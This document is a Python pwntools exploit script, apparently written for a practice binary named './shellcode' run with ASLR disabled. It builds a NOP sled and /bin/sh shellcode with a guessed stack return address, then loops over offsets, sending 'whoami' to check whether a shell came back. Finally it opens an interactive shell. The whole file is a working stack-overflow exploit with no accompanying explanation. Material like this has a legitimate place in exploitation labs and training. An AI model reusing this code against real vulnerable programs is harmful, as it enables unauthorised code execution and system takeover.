#!/usr/bin/python
from pwn import *
import sys

context.arch   = "amd64"
debug_buf_addr = 0x7fffffffde88
guessing_range = 200

def payload(offset):
    return sled + shellcode + p64(debug_buf_addr + offset)

shellcode = asm("add rsp, 0x38") + asm(shellcraft.sh())
sled = asm("nop") * (80 - len(shellcode))

# use the specified offset if provided
if len(sys.argv) > 1:
    p = process("./shellcode", aslr=False)
    p.sendline(payload(int(sys.argv[1])))
    p.interactive()
    exit(0)

# guess several offsets and store the ones that work
working_offsets = []
for offset in range(-guessing_range, guessing_range, len(sled) / 2):
    log.info("Trying offset {}".format(offset))
    p = process("./shellcode", aslr=False)
    p.sendline(payload(offset))
    p.readuntil("action.\n")

    # trying sending a shell command and checking the response
    try:
        p.sendline("whoami")
        if p.read(timeout=0.1) != "":
            log.success("Offset {} works!!!".format(offset))
            working_offsets.append(offset)
    except EOFError:
        pass

if working_offsets:
    # spawn a shell using the average working offset
    avg_offset = sum(working_offsets) / len(working_offsets)
    log.success("Spawning shell with offset {}".format(avg_offset))
    shell = process("./shellcode", aslr=False)
    shell.sendline(payload(avg_offset))
    shell.interactive()
else:
    log.failure("No working offsets found")
